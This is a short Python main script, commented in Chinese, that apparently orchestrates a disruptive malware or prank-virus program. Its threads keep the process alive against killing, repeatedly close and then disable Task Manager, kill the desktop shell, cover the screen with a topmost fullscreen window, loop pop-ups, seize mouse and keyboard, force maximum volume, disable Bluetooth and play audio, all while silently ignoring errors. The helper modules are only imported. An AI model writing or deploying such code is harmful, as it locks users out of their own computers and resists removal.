from threading import Thread # 创建线程
from time import sleep # 延时

from utils.ShowMessage import showMessage # 显示消息
from utils.PlayAudio import playAudio, speakText # 播放音频
from utils.TaskManager import monitorTaskManager # 操控任务管理器
from utils.PermissionControl import controlTaskManager, disableBluetooth # 权限操作
from utils.ControlMouseKeys import controlMouseKeys # 操控鼠标键盘
from utils.ControlSystem import endDesktopProgram, fullScreenWindow, monitorProcess, errorWindow # 操控系统


# 主函数
def startExecuting():
    try:
        Thread(target=errorWindow).start() # 弹出错误窗口

        Thread(target=monitorProcess).start() # 保活进程防止被杀死
        Thread(target=monitorTaskManager).start() # 循环关闭任务管理器
        sleep(300) # 延时300秒

        Thread(target=endDesktopProgram).start() # 杀死桌面程序造成白屏
        Thread(target=fullScreenWindow).start() # 创建全屏窗口置顶占领桌面
        Thread(target=showMessage).start() # 循环弹窗

        Thread(target=controlTaskManager, args=(True,)).start() # 禁用任务管理器（权限）

        Thread(target=controlMouseKeys).start() # 控制鼠标和让声音一直最大
        Thread(target=disableBluetooth).start() # 禁用蓝牙（权限）
        Thread(target=playAudio).start() # 播放音频
        
        speakText() # 播放提示音
    except: pass # 忽略错误

